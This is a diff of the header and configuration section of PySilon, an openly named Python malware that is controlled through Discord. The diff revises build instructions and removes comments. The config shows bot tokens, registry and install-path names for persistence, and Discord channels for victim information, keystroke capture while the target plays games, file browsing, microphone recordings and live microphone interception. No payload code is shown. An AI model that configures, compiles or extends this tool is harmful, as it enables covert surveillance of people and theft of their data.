@@ -32,10 +32,9 @@ import os
 #    READ BEFORE RUNNING!
 #
 #    1. If you run this script by interpreter (not built executable), uncomment Line-105.
-#    2. Don't insert or remove any line of code in this script, because that will produce errors in compiler.py
-#    3. Before you run this code or compile it or send to someone, read the Disclaimer (Line-65) carefully.
-#    4. If you encounter any errors, please let me know and I will be more than happy to help. [https://github.com/mategol/PySilon-malware/issues/new/choose]
-#    5. I highly SUGGEST you to test compiled executable on Virtual Machnine before you will "give it a use".
+#    2. Before you run this code or compile it or send to someone, read the Disclaimer (Line-65) carefully.
+#    3. If you encounter any errors, please let me know and I will be more than happy to help. [https://github.com/mategol/PySilon-malware/issues/new/choose]
+#    4. I highly SUGGEST you to test compiled executable on Virtual Machnine before you will "give it a use".
 #       If there would be any errors (probably wont but it's still freaking Windows), I could fix them for you.
 #
 #    HOW TO COMPILE:
@@ -53,11 +52,11 @@ import os
 #    2. Delete the '.webcam' command from 'on_message' function (lines 691-703)
 #
 #
-#
-#
-#
-#
-#
+#    DON'T EVEN TRY TO COMPILE THE SOURCE CODE INTO EXECUTABLE ON YOUR OWN
+#    
+#    Use compiler.py. Unless you exacly know what are you doing. But if you
+#    encounter errors while compiling without compiler.py, don't post Issues
+#    on GitHub.
 #
 
 ###############################################################################
@@ -77,21 +76,21 @@ import os
 # - Please check out README.md before  - #     ! It is recommended to use compiler.py for building executable !
 # -   you change following settings    - #       (following settings will be configured directly in compiler.py)
 
-bot_tokens = ['']   # Paste here BOT-token
-software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
-software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
-software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
+bot_tokens = ['']
+software_registry_name = 'PySilon'
+software_directory_name = software_registry_name
+software_executable_name = software_registry_name.replace(' ', '') + '.exe'
 
 channel_ids = {
-    'info': None,  # Paste here info channel ID for victim information
-    'main': None,   # Paste here main channel ID for general output
-    'spam': None,   # Paste here spam channel ID for filter key spamming (mostly while target play game)
-    'file': None,   # Paste here file-related channel ID for browsing, downloading and uploading files
-    'recordings': None,   # Paste here recording channel ID for microphone recordings storing
-    'voice': None   # Paste here voice channel ID for realtime microphone intercepting
+    'info': None,
+    'main': None,
+    'spam': None,
+    'file': None,
+    'recordings': None,
+    'voice': None
 }
 
-secret_key = ''   # Don't touch this line (just leave)
+secret_key = ''
 guild_id = None
 
 # -            End of config           - #
